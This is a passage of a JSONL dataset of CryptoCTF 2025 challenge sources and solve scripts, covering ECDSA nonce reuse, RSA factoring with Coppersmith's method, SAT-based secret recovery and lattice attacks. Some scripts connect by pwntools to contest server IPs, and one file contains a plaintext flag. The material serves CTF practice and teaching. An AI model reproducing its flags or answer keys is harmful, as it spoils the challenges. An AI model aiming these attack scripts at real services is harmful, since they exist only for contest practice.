"exp_half_flag"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\CryptoCTF\\Goliver_II\\goliver_ii.py", "category": "crypto", "solution_code": "#!/usr/bin/env python3\n\nfrom hashlib import sha256\nimport sys\nfrom Crypto.Util.number import *\n# from flag import flag\nflag = b'CCTF{!_4m_A_9!an7_am0nG_tH3_tIny_LilliputianS!}'\n\ndef die(*args):\n\tpr(*args)\n\tquit()\n\ndef pr(*args):\n\ts = \" \".join(map(str, args))\n\tsys.stdout.write(s + \"\\n\")\n\tsys.stdout.flush()\n\ndef sc():\n\treturn sys.stdin.buffer.readline()\n\ndef ADD(A, B):\n\ts = (B[1] - A[1]) * inverse(B[0] - A[0], p) % p\n\tx = (s**2 - A[0] - B[0]) % p\n\ty = (s * (A[0] - x) - A[1]) % p\n\treturn (x, y)\n\ndef DOUBLE(A):\n\ts = ((3 * A[0] ** 2 + a) * inverse(2 * A[1], p)) % p\n\tx = (s**2 - 2 * A[0]) % p\n\ty = (s * (A[0] - x) - A[1]) % p\n\treturn (x, y)\n\ndef MUL(A, d):\n\t_B = bin(d)[2:]\n\t_Q = A\n\tfor i in range(1, len(_B)):\n\t\t_Q = DOUBLE(_Q)\n\t\tif _B[i] == \"1\":\n\t\t\t_Q = ADD(_Q, A)\n\treturn _Q\n\ndef GENKEY():\n\tskey = getRandomRange(1, p)\n\tpubkey = MUL(G, skey)\n\treturn (pubkey, skey)\n\ndef is_valid_k(k, used_k=set()):\n\tif k in used_k:\n\t\treturn False\n\tused_k.add(k)\n\treturn True\n\ndef _prepare(sign_id, msg):\n\tk = sign_id + int.from_bytes(msg, \"big\")\n\tif not is_valid_k(k):\n\t\treturn None\n\tr, _ = MUL(G, k)\n\thmsg = int.from_bytes(sha256(msg).digest(), \"big\")\n\treturn k, r, hmsg\n\ndef sign(sign_id, msg):\n\tk, r, hmsg = _prepare(sign_id, msg)\n\ts = (inverse(k, n) * (hmsg + r * skey)) % n\n\treturn s\n\ndef verify(sign_id, msg, s):\n\t_, r, hmsg = _prepare(sign_id, msg)\n\tu1 = (hmsg * inverse(s, n)) % n\n\tu2 = (r * inverse(s, n)) % n\n\tx1, _ = ADD(MUL(G, u1), MUL(pubkey, u2))\n\treturn (x1 % n) == (r % n)\n\ndef main():\n\tborder = \"â”ƒ\"\n\tpr(\"â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”“\")\n\tpr(\n\t\tborder,\n\t\t\"Welcome! Our signature is half the size of traditional ECDSA, yet super\",\n\t\tborder,\n\t)\n\tpr(\n\t\tborder,\n\t\t\"secure with the BTC curve. Try the demo!                               \",\n\t\tborder,\n\t)\n\tpr(\"â”—â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”›\")\n\tglobal p, a, b, G, n, pubkey, skey\n\tp = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F\n\ta, b = 0, 7\n\tn = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141\n\tx = 0x4F22E22228BD75086D77AE65174C000F132BFD4EF3E28BEF20AC476997D4444F\n\ty = 0x3456B224247A4F73BF187AC25864F8F694C078380E6BDDF51379AC33F18BD829\n\tG = (x, y)\n\tpubkey, skey = GENKEY()\n\tlevel, STEP, _b = 0, 3, False\n\twhile True:\n\t\tpr(\n\t\t\t\"| Options: \\n|\\t[S]ign flag \\n|\\t[V]erify sign \\n|\\t[G]et the flag \\n|\\t[P]ublic key \\n|\\t[Q]uit\"\n\t\t)\n\t\tans = sc().decode().strip().lower()\n\t\tif ans == \"s\":\n\t\t\tpr(border, f\"Please provide sign_id:\")\n\t\t\tsign_id = sc().decode()\n\t\t\ttry:\n\t\t\t\tsign_id = int(sign_id)\n\t\t\t\t_b = sign_id > 0\n\t\t\texcept:\n\t\t\t\tdie(border, f\"The input sign_id you provided is not valid!\")\n\t\t\tif _b:\n\t\t\t\ts = sign(sign_id, msg = flag[:len(flag) >> 1])\n\t\t\t\tif s is None:\n\t\t\t\t\tdie(border, f\"Double use of the same sign_id is not possible!\")\n\t\t\t\tpr(border, f\"s = {s}\")\n\t\t\t\tif level == STEP:\n\t\t\t\t\tdie(border, f\"You have only {STEP} rounds to check.\")\n\t\t\t\telse:\n\t\t\t\t\tlevel += 1\n\t\t\telse:\n\t\t\t\tdie(border, f\"sign_id is a positive value! Bye!!\")\n\t\telif ans == \"v\":\n\t\t\tpr(border, \"Please send the sign_id, message, and signature: \")\n\t\t\tinp = sc().decode()\n\t\t\ttry:\n\t\t\t\tsign_id, msg, s = [int(_) for _ in inp.split(\",\")]\n\t\t\texcept:\n\t\t\t\tdie(border, f\"The input you provided is not valid!\")\n\t\t\tif verify(sign_id, msg, s):\n\t\t\t\tdie(border, f\"The signature is correct\")\n\t\t\telse:\n\t\t\t\tdie(border, f\"The signature is incorrect\")\n\t\telif ans == \"g\":\n\t\t\tpr(border, \"Please send the private key: \")\n\t\t\t_skey = sc().decode()\n\t\t\ttry:\n\t\t\t\t_skey = int(_skey)\n\t\t\texcept:\n\t\t\t\tdie(border, \"The private key is incorrect! Quitting...\")\n\t\t\tif _skey == skey:\n\t\t\t\tdie(border, f\"Congrats, you got the flag: {flag}\")\n\t\t\telse:\n\t\t\t\tdie(border, f\"The private key is incorrect! Quitting...\")\n\t\telif ans == \"p\":\n\t\t\tpr(border, f\"pubkey = {pubkey}\")\n\t\telif ans == \"q\":\n\t\t\tdie(border, \"Quitting...\")\n\t\telse:\n\t\t\tdie(border, \"Bye...\")\n\nif __name__ == \"__main__\":\n\tmain()", "name": "goliver_ii"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\CryptoCTF\\Goliver_II\\solve_local.py", "category": "crypto", "solution_code": "from sage.all import EllipticCurve, GF, ZZ\n# nc 91.107.252.0 17733\nfrom pwn import remote, context, log, process\nfrom sage.all import PolynomialRing, Zmod, Ideal\nfrom Crypto.Util.number import long_to_bytes\n\np = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F\na, b = 0, 7\nn = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141\nx = 0x4F22E22228BD75086D77AE65174C000F132BFD4EF3E28BEF20AC476997D4444F\ny = 0x3456B224247A4F73BF187AC25864F8F694C078380E6BDDF51379AC33F18BD829\nG = (x, y)\n\npr = PolynomialRing(GF(n), [\"sk0\", \"sk1\", \"sk2\", \"sk3\", \"f\", \"hm\", \"r0\", \"r1\", \"r2\"])\nsk0, sk1, sk2, sk3, f, hm, r0, r1, r2 = pr.gens()\nsks = [sk0, sk1, sk2, sk3]\n\nbasis = [sk2**2 + 74767669207013409338890436130748029424931449992550991996087234932499957547908*sk2*sk3 + 27261243583201950420905821351610486807161145583974612541816118695536833005127*sk3**2, \n         sk2*hm + 88574485813055703586852188699944357832619466011166775007341404973279060172889*sk2 + 73641516065142874136378815630625843746259775492325296268125735709867899614724*sk3, \n         sk3*hm + 93902743841434967754226814568008301940506678204624195566029822889680329406909*sk2 + 39995751498440871726907615314972870680373671075169108260667908265602692482008*sk3, \n         hm**2 + 12778148074180379890188819006229320660155572807260978885404150097363591160560*hm + 78048683503217539857471585736105873621352102558011456831972877489657722032620, \n         sk2*r1 + 32693891454692920401672976394670442798252953213881487820752864642610015768214*hm + 64730592784137417905394882924853462769774606968409446070516412531769472542945, \n         sk3*r1 + 3719354054629977975904898684864124825238450439163334565278900489474456601*hm + 62482033559241990783403350793224854654491848413469640430527088075778341624172, \n         hm*r1 + 109803322908978600303848398968658616154455133604891458022375337558009105671871*r1 + 30711745548478716087491901016227496275892212610332291239844596439920411045731*r2, \n         r1**2 + 17483346959974243831865670888879851691861141403070226015643889689778300902373*r1*r2 + 105031348035560600146832900344303018487992001157856876450694187643027590393244*r2**2,\n         sk2*r2 + 67295951607721910681688617705961073131724156311032115522459288401081029340565*hm + 106948869121758254612480637898307262864168619498550887035769415315648052983674, \n         sk3*r2 + 8171477479845275732281718708362758760034288814113725723781565047462748429549*hm + 65281182556397062954986054218425984159645552057780802904198657463475094791976, \n         hm*r2 + 56929872682944107121948884446354311799157151343714674614578280371281067069919*r1 + 18766914402517975009911405046258612358538003481444425245633975680872646983026*r2, \n         sk0 + 113403087937397458642253606352004497808111022082852270517320337090711769486219*sk2 + 2389001299918736781317378656683410044726542196222633865284826050806392008117*sk3, \n         sk1 + 29449681030533938555700699655300194071324331397420469021235211343746073482827*sk2 + 86342408206782256867870285353387713781513232881654435361369951797772088011509*sk3, \n         f + 83869434115339975445680332736367952520055225235799731772737243493084027298146*hm + 84836197096089204337376116676029479015722251754136096386045197779716164916165, \n         r0 + 107649190424268099125595762734903542079665641571470554631089848426115470492135*r1 + 30391199607659978977580729954524342113021863475233932338223063351043685971331*r2]\n\nhm_poly = basis[3]\nhm_poly_univariate = hm_poly.univariate_polynomial()\nf_hm_poly = basis[-2]\nprint(\"hm_poly:\", hm_poly)\nhm_roots = hm_poly_univariate.roots()\nfor root in hm_roots:\n    # print(\"hm root:\", root)\n    f_poly = f_hm_poly.substitute(hm=root[0])\n    f_poly_univariate = f_poly.univariate_polynomial()\n    f_roots = f_poly_univariate.roots()\n    for f_root in f_roots:\n        f_val = f_root[0]\n        hm_val = root[0]\n        flag_half = long_to_bytes(int(f_val))\n        if flag_half.startswith(b\"CCTF\"):\n            print(flag_half)\n", "name": "solve_local"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\CryptoCTF\\Mancity\\mancity.py", "category": "crypto", "solution_code": "#!/usr/bin/env python3\n\nfrom Crypto.Util.number import *\nfrom flag import flag\n\ndef man(n):\n\tB = bin(n)[2:]\n\tM = ''\n\tfor b in B:\n\t\tif b == '0':\n\t\t\tM += '01'\n\t\telse:\n\t\t\tM += '11'\n\treturn int(M, 2)\n\ndef keygen(nbit):\n\twhile True:\n\t\tp = getPrime(nbit)\n\t\tr = man(p)\n\t\tB = bin(p)[2:] + '1' * nbit\n\t\tq = int(B, 2)\n\t\tif isPrime(q) and isPrime(r):\n\t\t\t\treturn q, r\n\nnbit = 256\np, q = keygen(nbit)\nm = bytes_to_long(flag)\nassert m < n\ne, n = 1234567891, p * q\nc = pow(m, e, n)\n\nprint(f'n = {n}')\nprint(f'c = {c}')", "name": "mancity"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\CryptoCTF\\Mancity\\mancity_solve.py", "category": "crypto", "solution_code": "\nfrom sage.all import PolynomialRing, Zmod\nfrom Crypto.Util.number import long_to_bytes\nn = 147170819334030469053514652921356515888015711942553338463409772437981228515273287953989706666936875524451626901247038180594875568558137526484665015890594045767912340169965961750130156341999306808017498374501001042628249176543370525803456692022546235595791111819909503496986338431136130272043196908119165239297\nc = 77151713996168344370880352082934801122524956107256445231326053049976568087412199358725058612262271922128984783428798480191211811217854076875727477848490840660333035334309193217618178091153472265093622822195960145852562781183839474868269109313543427082414220136748700364027714272845969723750108397300867408537\n\nqlsb = int(256 * '1', 2)\nplsb = pow(qlsb, -1, 2**256) * n % 2**256\nassert plsb * qlsb % 2**256 == n % 2**256\n\nplsb_bits = bin(plsb)[2:].zfill(256)\nqbits = \"\"\nfor i in range(0, 256, 2):\n    if plsb_bits[i:i+2] == '01':\n        qbits += '0'\n    elif plsb_bits[i:i+2] == '11':\n        qbits += '1'\n    else:\n        raise ValueError(\"Unexpected bits in plsb\")\n\nqleak = int(qbits, 2) * 2**256 + qlsb\nprint(f\"q_leak: {qleak}\")        \npr = PolynomialRing(Zmod(n), 'x')\nx = pr.gen()\nf = qleak  + x * 2**(256 + 128)\nroot = f.monic().small_roots(X = 2**(128), beta = 0.499, epsilon = 0.05)\nif root:\n    qh = root[0]\n    q = int(qh) * 2**(256 +128) + qleak\n    p = n // q\n    assert p * q == n\n    d = pow(1234567891, -1, (p-1)*(q-1))\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(f\"Flag: {flag}\")", "name": "mancity_solve"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\CryptoCTF\\Nahan\\exp.py", "category": "crypto", "solution_code": "from pwn import remote, process, context, info\nfrom Crypto.Util.number import isPrime\nfrom random import randrange\nfrom tqdm import tqdm, trange\nfrom ortools.sat.python import cp_model\n\n\ndef server_next_prime(n):\n    while True:\n        if isPrime(n):\n            return n\n        else:\n            n += 1\n\ndef sat_solver(r, w, bitlen = 248):\n    model = cp_model.CpModel()\n    b = [model.NewBoolVar(f\"b[{j}]\") for j in range(bitlen)]\n    model.add(b[0] == 1)  # Ensure the lsb is 1\n    model.add(b[-1] == 1)  # Ensure the msb is 1\n    for i, (r_i, w_i) in enumerate(zip(r, w)):\n        x = []\n        for j in range(bitlen):\n            bit = (r_i >> j) & 1\n            if bit == 0:\n                # x_ij == b_j\n                x.append(b[j])\n            else:\n                # x_ij == NOT b_j\n                xj = model.NewBoolVar(f\"x[{i},{j}]\")\n                model.Add(xj + b[j] == 1)\n                x.append(xj)\n        model.Add(sum(x) == w_i)\n\n    solver = cp_model.CpSolver()\n    status = solver.Solve(model)\n    if status == cp_model.OPTIMAL or status == cp_model.FEASIBLE:\n        s = 0\n        for j in range(bitlen):\n            if solver.Value(b[j]):\n                s |= (1 << j)\n        print(\"s =\", hex(s))\n        return s\n    else:\n        print(\"No solution found\")\n        return None\n\nio = process([\"python3\", \"nahan.py\"])\nsecret = int(io.recvline().strip())\n# info(f\"Secret: {hex(secret)}\")\nl = 248\nstep = l // 2\n\nrs = []\nss = []\nts = []\nfor i in tqdm(range(step)):\n    while 1:\n        s, t = randrange(2**(l//3), 2**(l//2)), randrange(2**(l//3), 2**(l//2))\n        if all(3 * l > 6 * _.bit_length() > 2 * l for _ in (s, t)):\n            r = int(server_next_prime(s * t ^ (2**l)))\n            break\n    rs.append(r)\n    ss.append(s)\n    ts.append(t)\n\ninfo(f\"Collecting {step} data samples...\")\nws = []\nfor i in trange(step):\n    io.sendlineafter(b\"[Q]uit\\n\", b'g')\n    io.sendlineafter(b\"s, t: \", f\"{ss[i]},{ts[i]}\".encode())\n    r = rs[i]\n    io.recvuntil(b'n = ')\n    n = int(io.recvline().strip())\n    assert n % r == 0, \"n is not divisible by r\"\n    w = int(n // r).bit_count() - 1 # the msb (2^248) of r is always 1, so we subtract 1\n    ws.append(w)\n\ninfo(\"Sat Solving...\")\ns_recovered = sat_solver(rs, ws)\nio.sendlineafter(b\"[Q]uit\\n\", b's')\nio.sendlineafter(b\"secret: \\n\", str(s_recovered).encode())\nresponse = io.recvline()\nprint(response.decode())", "name": "exp"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\CryptoCTF\\Nahan\\gpt_solve1.py", "category": "crypto", "solution_code": "from ortools.sat.python import cp_model\nimport random\ns = random.randint(0, 2**256 - 1)  # å‡è®¾sæ˜¯ä¸€ä¸ª256ä½çš„æ•´æ•°\nr = [random.randint(0, 2**256 - 1) for _ in range(128)]  # å‡è®¾ræ˜¯ä¸€ä¸ªåŒ…å«128ä¸ª256ä½æ•´æ•°çš„åˆ—è¡¨\nw = [int(s ^ r[i]).bit_count() for i in range(128)]  # å·²çŸ¥çš„w_i\n\nprint(\"s =\", hex(s))\n\nmodel = cp_model.CpModel()\n# 256 ä¸ª 0/1 å˜é‡\nb = [model.NewBoolVar(f\"b[{j}]\") for j in range(256)]\n\nfor i, (r_i, w_i) in enumerate(zip(r, w)):\n    # å¯¹ç¬¬ i ä¸ªè§‚æµ‹ï¼Œå…ˆæž„é€ ä¸€ç»„ BoolVar x_ij = b_j XOR r_ij\n    x = []\n    for j in range(256):\n        bit = (r_i >> j) & 1\n        if bit == 0:\n            # x_ij == b_j\n            x.append(b[j])\n        else:\n            # x_ij == NOT b_j\n            xj = model.NewBoolVar(f\"x[{i},{j}]\")\n            model.Add(xj + b[j] == 1)\n            x.append(xj)\n    # å¡ä¸çº³å°”æ€§çº¦æŸï¼šsum_j x[j] == w_i\n    model.Add(sum(x) == w_i)\n\nsolver = cp_model.CpSolver()\nstatus = solver.Solve(model)\nif status == cp_model.OPTIMAL or status == cp_model.FEASIBLE:\n    s = 0\n    for j in range(256):\n        if solver.Value(b[j]):\n            s |= (1 << j)\n    print(\"s =\", hex(s))\nelse:\n    print(\"æ— è§£\")\n", "name": "gpt_solve1"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\CryptoCTF\\Nahan\\gpt_solve2.py", "category": "crypto", "solution_code": "import numpy as np\nimport random\n\n# æ¨¡æ‹Ÿæ•°æ®\ns = random.getrandbits(256)\nr_list = [random.getrandbits(256) for _ in range(128)]\nw_list = [bin(s ^ r).count('1') for r in r_list]  # popcount(s ^ r)\n\ndef get_bit(x, i):\n    return (x >> i) & 1\n\ndef recover_s_bitwise(r_list, w_list):\n    bit_scores = []\n    for j in range(256):\n        rj_bits = np.array([get_bit(r, j) for r in r_list])\n        w_array = np.array(w_list)\n\n        # çš®å°”é€Šç›¸å…³ç³»æ•°ï¼ˆè¶Šè´Ÿè¯´æ˜Ž s_j = 1 çš„å¯èƒ½æ€§è¶Šå¤§ï¼‰\n        corr = np.corrcoef(rj_bits, w_array)[0, 1]\n        bit_scores.append(corr)\n\n    # è§£é‡Šï¼š\n    # è´Ÿç›¸å…³ â‡’ s_j = 1ï¼ˆå› ä¸º 1 âŠ• r_j ç¿»è½¬ï¼Œå¯¼è‡´ popcount å€¼å˜åŒ–æ–¹å‘ç›¸åï¼‰\n    # æ­£ç›¸å…³ â‡’ s_j = 0ï¼ˆr_j ä¿æŒä¸å˜ï¼Œå¯¹ popcount å¢žåŠ èµ·æ­£è´¡çŒ®ï¼‰\n    s_recovered = 0\n    for j, score in enumerate(bit_scores):\n        if score < 0:\n            s_recovered |= (1 << j)\n    return s_recovered\n\ns_recovered = recover_s_bitwise(r_list, w_list)\n\n# è¯„ä¼°æ¢å¤æ•ˆæžœ\ndiff = s ^ s_recovered\nerror_bits = bin(diff).count('1')\nprint(f\"Recovered s has {error_bits} bit errors out of 256\")\n", "name": "gpt_solve2"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\CryptoCTF\\Nahan\\gpt_solve3.py", "category": "crypto", "solution_code": "import numpy as np\nimport random\nfrom Crypto.Util.number import getPrime\n\n# æ¨¡æ‹Ÿç”Ÿæˆæ•°æ®\ndef nth_bit(x, n):\n    return (x >> n) & 1\n\ndef popcount(x):\n    return bin(x).count('1')\n\n# ground truth\nnbit = 248\ns = getPrime(nbit)\nr = [getPrime(nbit + 1) for _ in range(nbit//2)]\nw = [popcount(s ^ r_i) for r_i in r]\n\n# æ¢å¤ s\ncorrelations = []\nfor bit in range(nbit):\n    r_bit_column = [nth_bit(r_i, bit) for r_i in r]  # ç¬¬bitä½çš„å–å€¼åºåˆ—\n    corr = np.corrcoef(r_bit_column, w)[0, 1]  # ä¸Ž popcount çš„ Pearson ç›¸å…³ç³»æ•°\n    correlations.append(corr)\n\nprint(f\"Correlations: {correlations}\")\n# æ ¹æ®ç›¸å…³æ€§æ¢å¤æ¯ä¸€ä½\nrecovered_s_bits = [0 if corr > 0 else 1 for corr in correlations]\n\n# æž„é€  recovered s æ•´æ•°\nrecovered_s = 0\nfor i, b in enumerate(recovered_s_bits):\n    recovered_s |= (b << i)\n\n# è®¡ç®—å‡†ç¡®çŽ‡\ndiff = s ^ recovered_s\nerror_bits = popcount(diff)\nprint(f\"Recovered s: {hex(recovered_s)}\")\nprint(f\"Actual     s: {hex(s)}\")\nprint(f\"Bit errors: {error_bits} / {nbit} ({100*error_bits/nbit:.2f}%)\")\n", "name": "gpt_solve3"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\CryptoCTF\\Nahan\\nahan.py", "category": "crypto", "solution_code": "#!/usr/bin/env python3\n\nimport sys\nfrom Crypto.Util.number import *\nfrom random import *\n# from flag import flag\nflag = b\"C\" * 31\n\ndef die(*args):\n\tpr(*args)\n\tquit()\n\t\ndef pr(*args):\n\ts = \" \".join(map(str, args))\n\tsys.stdout.write(s + \"\\n\")\n\tsys.stdout.flush()\n\t\ndef sc(): \n\treturn sys.stdin.buffer.readline()\n\ndef next_prime(n):\n\twhile True:\n\t\tif isPrime(n): return n\n\t\telse: n += 1\n\ndef main():\n\tsecret = getPrime(len(flag) << 3)\n\t# print(secret)\n\tborder = \"â”ƒ\"\n\tpr(        \"â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”“\")\n\tpr(border, \".:::     Welcome to the Nahan Maskara cryptography task!      ::.\", border)\n\tpr(border, \".: Your mission is to find flag by analysing the Nahan Maskara :.\", border)\n\tpr(        \"â”—â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”›\")\n\tl, c, step = secret.bit_length(), 0, secret.bit_length() >> 1\n\twhile True:\n\t\tpr(f\"{border} Options: \\n{border}\\t[G]et Nahan value! \\n{border}\\t[S]end secret! \\n{border}\\t[Q]uit\")\n\t\tR, _b = [], False\n\t\tans = sc().decode().strip().lower()\n\t\tif ans == 'g':\n\t\t\tpr(border, 'Now please provide two integers s, t: ')\n\t\t\tinp = sc().decode().strip()\n\t\t\ttry:\n\t\t\t\ts, t = [int(_) for _ in inp.split(',')]\n\t\t\t\tif all(3 * l > 6 * _.bit_length() > 2 * l for _ in (s, t)):\n\t\t\t\t\t_b = True\n\t\t\texcept:\n\t\t\t\tdie(border, f\"The input you provided is not valid!\")\n\t\t\tif _b:\n\t\t\t\tr = next_prime(s * t ^ 2 ** l)\n\t\t\t\tif r in R:\n\t\t\t\t\tdie(border, 'You cannot use repeated integers! Bye!!')\n\t\t\t\telse:\n\t\t\t\t\tR.append(r)\n\t\t\t\tu = list(bin(secret ^ r)[2:])\n\t\t\t\tshuffle(u)\n\t\t\t\tpr(border, f'n = {r * int(\"\".join(u), 2)}')\n\t\t\t\tif c >= step:\n\t\t\t\t\tdie(border, f'You can get Nahan value at most {step} times! Bye!!')\n\t\t\t\tc += 1\n\t\t\telse:\n\t\t\t\tdie(border, f\"Your input does not meet the requirements!!!\")\n\t\telif ans == 's':\n\t\t\tpr(border, \"Please send secret: \")\n\t\t\t_secret = sc().decode()\n\t\t\ttry:\n\t\t\t\t_secret = int(_secret)\n\t\t\texcept:\n\t\t\t\tdie(border, \"The secret is incorrect! Quitting...\")\n\t\t\tif _secret == secret:\n\t\t\t\tdie(border, f\"Congrats, you got the flag: {flag}\")\n\t\t\telse:\n\t\t\t\tdie(border, \"The secret is incorrect! Quitting...\")\n\t\telif ans == 'q':\n\t\t\tdie(border, \"Quitting...\")\n\t\telse:\n\t\t\tdie(border, \"Bye...\")\n\nif __name__ == '__main__':\n\tmain()", "name": "nahan"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\CryptoCTF\\Snails\\solve.py", "category": "crypto", "solution_code": "from sage.all import EllipticCurve, GF, matrix, vector, ZZ\nfrom Crypto.Util.number import bytes_to_long, getRandomNBitInteger, long_to_bytes\nfrom hashlib import sha512\nimport os\nfrom pwn import remote, process, log\nimport string\nimport random\nfrom tqdm import tqdm\n\n\ntable = string.ascii_letters + string.digits\n\n\ndef gen_small_msg(ub = 2**(512 - 8), contain = 'âœ”âœ”âœ” My signature is the priority'.encode()):\n    for ch1 in range(33, 128):\n        for ch2 in range(33, 128):\n            msg = contain + bytes([ch1, ch2])\n            h = bytes_to_long(sha512(msg).digest())\n            if h < ub:\n                yield msg\n            msg = bytes([ch1, ch2]) + contain\n            h = bytes_to_long(sha512(msg).digest())\n            if h < ub:\n                yield msg\n            msg = bytes([ch1]) + contain + bytes([ch2])\n            h = bytes_to_long(sha512(msg).digest())\n            if h < ub:\n                yield msg\n# k * s = h + r * d\n# k = s_inv * h + (r * d) * s_inv\n\np = 0x013835f64744f5f06c88c8d7ebfb55e127d790e5a7a58b7172f033db4afad4aca1ae1cdb891338cf963b30ff08d6af71327770d00c472c52290a60fb43f1d070025b\na = 0x0109ec0177a5a57e7b7890993e11ba1bc7ba63c1f2afd904a1df35d1fda7363ea8e83f3291e25b69dac26d046dc5ba9a42ff74cd7e52c9df5dbe8d4d02755d26b111\nb = 0x0037c84047a6cc14e36d180f9b688fe9959cb63f4ac37b22eb24559e83cfc658ff0ab753540b8ab8d85a62dd67aa92f79dec20d28e453d4663ef2882c7b031ddc0b9\nn = 0x013835f64744f5f06c88c8d7ebfb55e127d790e5a7a58b7172f033db4afad4aca1aad8763fe2401b5189d1c449547a6b5295586ce30c94852845d468d52445548739\nx = 0x00339495fdbeba9a9f695d6e93effeb937609ce2e628958cd59ba307eb3a43c4c3a54b9b951cd593c876df93a9b0ed7d64df641af94668cb594b6a636ae386e1ac1b\ny = 0x00038389f29ad8c87e79a8b854e78310b72febb6b1840e360b0a43733933529ee6a04f6d7ea0d91104eb83d1162d55c410eca1c7b45829925fb2a9bf9c1232c32972\nE = EllipticCurve(GF(p), [a, b])\nG = E(x, y)\n\nlocal = False\n# nc 91.107.133.165 33337\nio = remote(\"91.107.133.165\", 33337) if not local else process([\"sage\", \"snails.sage\"])\n\ndef sign(msg: str, io: remote = io):\n    io.sendlineafter(b\"[Q]uit\\n\", b\"s\")\n    io.sendlineafter(b\"Please send your message: \", msg)\n    io.recvuntil(b\"r = \")\n    r = int(io.recvline().strip())\n    io.recvuntil(b\"s = \")\n    s = int(io.recvline().strip())\n    return (r, s)\n\nmsgs = [b'$\\xe2\\x9c\\x94\\xe2\\x9c\\x94\\xe2\\x9c\\x94 My signature is the priorityN', b'(w\\xe2\\x9c\\x94\\xe2\\x9c\\x94\\xe2\\x9c\\x94 My signature is the priority', b')\\xe2\\x9c\\x94\\xe2\\x9c\\x94\\xe2\\x9c\\x94 My signature is the priority;', b'\\xe2\\x9c\\x94\\xe2\\x9c\\x94\\xe2\\x9c\\x94 My signature is the priority*T', b'\\xe2\\x9c\\x94\\xe2\\x9c\\x94\\xe2\\x9c\\x94 My signature is the priority*w', b'+*\\xe2\\x9c\\x94\\xe2\\x9c\\x94\\xe2\\x9c\\x94 My signature is the priority', b'\\xe2\\x9c\\x94\\xe2\\x9c\\x94\\xe2\\x9c\\x94 My signature is the priority-4', b'\\xe2\\x9c\\x94\\xe2\\x9c\\x94\\xe2\\x9c\\x94 My signature is the priority-T', b'.s\\xe2\\x9c\\x94\\xe2\\x9c\\x94\\xe2\\x9c\\x94 My signature is the priority', b'\\xe2\\x9c\\x94\\xe2\\x9c\\x94\\xe2\\x9c\\x94 My signature is the priority07', b'0\\xe2\\x9c\\x94\\xe2\\x9c\\x94\\xe2\\x9c\\x94 My signature is the priorityI', b'\\xe2\\x9c\\x94\\xe2\\x9c\\x94\\xe2\\x9c\\x94 My signature is the priority0\\x7f', b'\\xe2\\x9c\\x94\\xe2\\x9c\\x94\\xe2\\x9c\\x94 My signature is the priority2z', b\"\\xe2\\x9c\\x94\\xe2\\x9c\\x94\\xe2\\x9c\\x94 My signature is the priority3'\", b'31\\xe2\\x9c\\x94\\xe2\\x9c\\x94\\xe2\\x9c\\x94 My signature is the priority', b'3\\xe2\\x9c\\x94\\xe2\\x9c\\x94\\xe2\\x9c\\x94 My signature is the priorityW', b'48\\xe2\\x9c\\x94\\xe2\\x9c\\x94\\xe2\\x9c\\x94 My signature is the priority', b'7\\xe2\\x9c\\x94\\xe2\\x9c\\x94\\xe2\\x9c\\x94 My signature is the priorityF', b'\\xe2\\x9c\\x94\\xe2\\x9c\\x94\\xe2\\x9c\\x94 My signature is the priority;Q', b'\\xe2\\x9c\\x94\\xe2\\x9c\\x94\\xe2\\x9c\\x94 My signature is the priority<A', b'<K\\xe2\\x9c\\x94\\xe2\\x9c\\x94\\xe2\\x9c\\x94 My signature is the priority', b'<\\\\\\xe2\\x9c\\x94\\xe2\\x9c\\x94\\xe2\\x9c\\x94 My signature is the priority', b'\\xe2\\x9c\\x94\\xe2\\x9c\\x94\\xe2\\x9c\\x94 My signature is the priority=0', b'=v\\xe2\\x9c\\x94\\xe2\\x9c\\x94\\xe2\\x9c\\x94 My signature is the priority', b'\\xe2\\x9c\\x94\\xe2\\x9c\\x94\\xe2\\x9c\\x94 My signature is the priority>Y', b'?N\\xe2\\x9c\\x94\\xe2\\x9c\\x94\\xe2\\x9c\\x94 My signature is the priority', b'\\xe2\\x9c\\x94\\xe2\\x9c\\x94\\xe2\\x9c\\x94 My signature is the priority?\\x7f', b'@\\xe2\\x9c\\x94\\xe2\\x9c\\x94\\xe2\\x9c\\x94 My signature is the priority1', b'A;\\xe2\\x9c\\x94\\xe2\\x9c\\x94\\xe2\\x9c\\x94 My signature is the priority', b'C\\xe2\\x9c\\x94\\xe2\\x9c\\x94\\xe2\\x9c\\x94 My signature is the 